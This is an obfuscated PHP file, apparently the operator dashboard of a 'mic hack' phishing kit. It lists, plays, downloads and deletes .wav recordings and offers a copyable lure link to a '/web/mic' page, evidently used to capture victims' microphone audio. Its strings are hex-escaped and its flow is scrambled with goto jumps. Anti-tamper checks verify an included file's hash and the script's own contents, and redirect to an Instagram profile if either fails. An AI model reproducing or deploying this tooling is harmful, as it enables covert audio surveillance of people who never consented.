<?php
 goto RlS04; aFDwB: include $impPath; goto Yle0a; ly7kG: if (!preg_match($pattern, $file_contents)) { echo "\74\163\143\162\151\x70\164\x3e\x77\x69\x6e\x64\157\167\56\x6c\157\x63\x61\164\151\x6f\156\56\x68\x72\145\x66\40\75\x20\x27\150\x74\164\160\x73\72\x2f\x2f\167\167\167\56\151\x6e\x73\x74\141\147\162\141\x6d\56\x63\157\155\x2f\x5f\56\155\x6d\x72\x65\x68\x75\57\47\x3b\x3c\x2f\163\143\x72\x69\160\164\76"; die; } goto ekEaA; Bmb0e: $pattern = "\57\151\x6e\143\x6c\165\x64\x65\x5c\163\x2b\134\44\x69\155\x70\x50\141\164\150\x5c\x73\52\x3b\57"; goto S3dCX; FHfvz: $totalPages = ceil($totalFiles / $perPage); goto nilLv; BDA1O: if (!empty($files)) { foreach ($files as $file) { $fileName = basename($file); $fileUrl = $webPath . $fileName; $fileTime = date("\x59\55\x6d\55\144\x20\110\x3a\151\x3a\x73", filemtime($file)); echo "\74\x74\x72\76\12\40\x20\40\x20\40\x20\x20\40\x20\40\x20\40\74\164\x64\x3e{$fileName}\x3c\x2f\x74\144\x3e\12\x20\40\40\x20\40\x20\40\40\x20\40\40\40\74\x74\x64\76" . explode("\40", $fileTime)[0] . "\74\57\x74\144\76\12\40\x20\40\40\40\40\x20\40\40\x20\x20\x20\74\164\x64\76" . explode("\x20", $fileTime)[1] . "\x3c\x2f\x74\x64\x3e\xa\x20\x20\x20\40\x20\x20\40\40\x20\x20\x20\x20\x3c\164\x64\x3e\74\142\x75\x74\164\x6f\156\x20\143\154\141\x73\163\75\47\142\164\x6e\40\x70\x6c\x61\171\x2d\x62\164\156\x27\40\x6f\156\143\x6c\151\143\x6b\75\42\160\154\x61\171\x41\165\x64\151\x6f\50\x27{$fileUrl}\47\x29\x22\x3e\120\154\x61\171\x3c\57\x62\165\x74\x74\x6f\156\x3e\74\57\164\x64\76\12\40\x20\40\40\40\40\x20\40\40\40\40\40\x3c\x74\x64\76\74\141\x20\150\162\x65\x66\x3d\47{$fileUrl}\x27\x20\144\x6f\167\156\x6c\x6f\141\144\76\x3c\142\x75\x74\x74\x6f\156\x20\143\x6c\141\163\x73\75\47\142\164\x6e\x20\x64\157\x77\x6e\154\x6f\x61\144\55\x62\x74\156\47\76\x44\157\167\156\154\x6f\141\x64\x3c\57\142\x75\x74\x74\x6f\x6e\x3e\74\57\141\x3e\x3c\57\x74\x64\x3e\xa\x20\40\x20\x20\40\40\x20\40\x20\x20\x20\x20\x3c\x74\144\76\74\141\x20\150\162\145\146\75\47\x64\x65\154\145\x74\145\155\x69\x63\x2e\x70\150\160\77\146\x69\x6c\145\x3d{$fileName}\x26\x70\x61\x67\x65\x3d{$page}\47\x20\12\x20\40\x20\x20\x20\x20\40\x20\x20\x20\x20\x20\40\x20\40\x20\x20\40\40\157\156\143\154\x69\x63\x6b\75\x22\x72\145\x74\x75\162\x6e\40\x63\x6f\156\146\x69\162\155\x28\x27\x41\x72\145\x20\x79\x6f\165\x20\x73\165\162\x65\40\171\x6f\165\40\167\x61\156\x74\x20\x74\157\x20\x64\x65\154\x65\x74\x65\x20\164\150\151\x73\x20\x66\x69\x6c\145\77\47\51\x3b\x22\76\12\x20\x20\x20\40\x20\x20\x20\x20\x20\x20\40\x20\x20\40\x20\40\40\40\40\74\142\x75\x74\164\157\156\40\143\x6c\x61\x73\x73\75\x27\x62\x74\156\x20\144\x65\154\145\x74\145\x2d\142\x74\156\47\x3e\104\x65\x6c\145\164\145\x3c\57\142\165\164\164\x6f\x6e\x3e\74\57\x61\76\x3c\x2f\164\144\76\xa\40\40\40\40\40\40\40\x20\74\x2f\x74\x72\76"; } } else { echo "\74\x74\162\x3e\x3c\x74\x64\40\x63\x6f\154\163\160\141\156\x3d\47\66\x27\x3e\x4e\x6f\40\146\151\154\x65\163\x20\x66\157\x75\156\x64\x3c\x2f\164\144\x3e\x3c\x2f\164\x72\76"; } goto scYyx; ZIkxu: rsort($files); goto Qqn7C; Lm9Xb: $page = isset($_GET["\160\x61\147\145"]) ? (int) $_GET["\x70\x61\147\145"] : 1; goto zE9cP; xpPly: ?>
</div><script>let currentAudio = null;

    function playAudio(file) {
        if (currentAudio) {
            currentAudio.pause();
        }
        currentAudio = new Audio(file);
        currentAudio.play();
    }</script><?php  goto Ug4ZG; K4daN: $files = glob("{$folder}\57\x2a\x2e\167\x61\166"); goto ZIkxu; JgjCa: $folder = realpath(__DIR__ . "\57\x72\145\143\x6f\162\x64\151\x6e\x67\163"); goto tQzRy; SoKe6: if (!file_exists($impPath) || md5_file($impPath) !== "\x62\x34\x37\x35\x63\70\x35\64\66\x31\66\61\60\61\71\70\142\x30\x39\x63\x61\x66\x34\70\146\x36\x30\63\x38\71\x63\66") { echo "\74\163\143\x72\x69\160\x74\76\167\151\156\144\157\x77\x2e\154\x6f\x63\141\164\x69\x6f\156\56\x68\x72\145\146\x20\75\x20\x27\x68\164\164\x70\163\72\57\x2f\x77\x77\x77\56\151\x6e\163\x74\x61\x67\162\141\155\56\143\157\155\x2f\137\56\155\155\x72\145\x68\x75\x2f\x27\x3b\x3c\x2f\x73\143\162\x69\x70\164\76"; die; } goto kYukU; OvxSP: if ($page > 1) { ?>
<a href="?page=<?php  echo $page - 1; ?>
">Previous</a><?php  } else { ?>
<a class="disabled">Previous</a><?php  } goto eNVrJ; kYukU: ?>
<!doctypehtml><html lang="en"><head><script src="https://code.jquery.com/jquery-3.6.0.min.js"></script><style>.btn{padding:5px 10px;border:none;cursor:pointer;border-radius:5px;font-weight:700}.play-btn{background-color:green;color:#fff}.download-btn{background-color:#00f;color:#fff}.delete-btn{background-color:red;color:#fff}.pagination{margin:20px}.pagination a{text-decoration:none;padding:8px 12px;background:red;color:#fff;border-radius:5px;margin:5px}.pagination a.disabled{background:gray;pointer-events:none}</style></head><div class="container-fluid pt-4 px-4"style="min-height:100vh"><div class="bg-secondary p-4 rounded text-center"style="height:auto;min-height:90vh"><div><div class="mic-hack-box"><input id="copyBox"readonly> <button class="copy-btn"onclick="copyText()">Copy</button></div><style>.mic-hack-box{background-color:transparent;border:2px solid red;color:red;font-size:16px;padding:10px;width:60%;margin:20px auto;display:flex;justify-content:space-between;align-items:center}.mic-hack-box input{width:85%;border:none;background:0 0;font-size:16px;color:red;outline:0}.copy-btn{background:red;color:#fff;border:none;padding:5px 10px;cursor:pointer;font-weight:700;border-radius:5px}</style><?php  goto fuPXs; MhsHH: $file_contents = file_get_contents($file_to_check); goto gTo4c; s6gem: $impPath = realpath(__DIR__ . "\57\151\155\160\x2e\x70\x68\x70"); goto SoKe6; RlS04: include realpath(__DIR__ . "\x2f\x68\145\141\144\56\x70\150\x70"); goto JgjCa; HLPFF: if (!preg_match($pattern, $file_contents)) { echo "\x3c\x73\143\x72\151\x70\164\x3e\167\x69\156\144\157\x77\x2e\154\157\x63\141\x74\151\157\156\56\150\162\x65\146\40\75\x20\x27\x68\x74\164\x70\x73\x3a\57\x2f\x77\167\x77\56\x69\x6e\x73\164\x61\x67\x72\141\155\x2e\143\x6f\155\57\137\56\x6d\155\162\145\150\x75\57\x27\x3b\x3c\x2f\x73\143\x72\x69\160\x74\x3e"; die; } goto xy0Ap; nilLv: $offset = ($page - 1) * $perPage; goto N2AbT; xy0Ap: ?>
<table class="align-middle mb-0 table table-bordered table-hover text-start"><thead><tr><th>Recording Name</th><th>Date</th><th>Time</th><th>Play</th><th>Download</th><th>Delete</th></tr></thead><tbody><?php  goto BDA1O; YCg2C: $file_to_check = __FILE__; goto TI190; TR2AH: $pattern = "\57\151\x6e\x63\154\x75\x64\145\134\x73\x2b\x5c\x24\151\x6d\160\120\141\x74\150\x5c\163\52\73\x2f"; goto MhsHH; fuPXs: $file_to_check = __FILE__; goto Bmb0e; scYyx: ?>
</tbody></table><div class="pagination"><?php  goto OvxSP; gTjA1: if (isset($_GET["\144\x65\x6c\145\x74\145"])) { $fileToDelete = $folder . "\57" . basename($_GET["\144\145\x6c\x65\164\145"]); if (file_exists($fileToDelete)) { unlink($fileToDelete); header("\114\157\x63\x61\x74\151\157\156\x3a\x20" . $_SERVER["\120\110\120\137\x53\x45\x4c\x46"] . "\x3f\160\141\x67\145\75{$page}"); die; } } goto s6gem; tQzRy: $webPath = "\x2f\x77\x65\142\x2f\x61\x64\x6d\x69\156\x2f\x64\141\163\x68\142\157\x61\162\x64\57\162\x65\x63\157\x72\x64\x69\156\x67\x73\x2f"; goto K4daN; Qqn7C: $perPage = 10; goto Lm9Xb; eNVrJ: if ($page < $totalPages) { ?>
<a href="?page=<?php  echo $page + 1; ?>
">Next</a><?php  } else { ?>
<a class="disabled">Next</a><?php  } goto xpPly; ekEaA: ?>
<script>document.addEventListener("DOMContentLoaded", function() {
        let copyBox = document.getElementById("copyBox");
        if (copyBox) {  // ✅ Ensuring the element exists before accessing it
            let domain = window.location.protocol + "//" + window.location.host;
            let scriptPath = "/web/mic";
            copyBox.value = domain + scriptPath;
        } else {
            console.error("copyBox element not found! Check your HTML.");
        }
    });

    function copyText() {
        let copyBox = document.getElementById("copyBox");
        if (copyBox) {
            copyBox.select();
            navigator.clipboard.writeText(copyBox.value).then(() => {
                alert("Copied: " + copyBox.value);
            }).catch(err => {
                console.error("Copy failed:", err);
            });
        } else {
            console.error("copyBox element not found! Cannot copy.");
        }
    }</script><script>document.addEventListener("DOMContentLoaded", function() {
        let canvas = document.getElementById("myCanvas");
        if (canvas) {
            let ctx = canvas.getContext("2d");
            if (ctx) {
                // Your drawing code here
            } else {
                console.error("getContext('2d') failed! Canvas might not be supported.");
            }
        } else {
            console.error("Canvas element not found!");
        }
    });</script><?php  goto YCg2C; TI190: $pattern = "\x2f\x69\x6e\x63\154\x75\x64\145\134\x73\53\x5c\x24\x69\155\x70\120\x61\164\150\134\163\x2a\73\x2f"; goto k3ayH; gTo4c: if (!preg_match($pattern, $file_contents)) { echo "\x3c\163\143\x72\151\x70\x74\76\167\x69\x6e\144\157\x77\56\x6c\x6f\143\x61\x74\151\157\x6e\56\x68\x72\x65\146\40\75\x20\47\x68\x74\x74\x70\163\72\57\57\167\167\x77\x2e\151\x6e\x73\x74\x61\147\x72\x61\x6d\x2e\x63\x6f\155\57\137\56\155\x6d\162\145\x68\x75\x2f\47\73\74\x2f\x73\143\162\151\x70\164\x3e"; die; } goto WOxc_; WOxc_: ?>
</div></div></div><?php  goto aFDwB; N2AbT: $files = array_slice($files, $offset, $perPage); goto gTjA1; k3ayH: $file_contents = file_get_contents($file_to_check); goto HLPFF; S3dCX: $file_contents = file_get_contents($file_to_check); goto ly7kG; Ug4ZG: $file_to_check = __FILE__; goto TR2AH; zE9cP: $totalFiles = count($files); goto FHfvz; Yle0a: ?>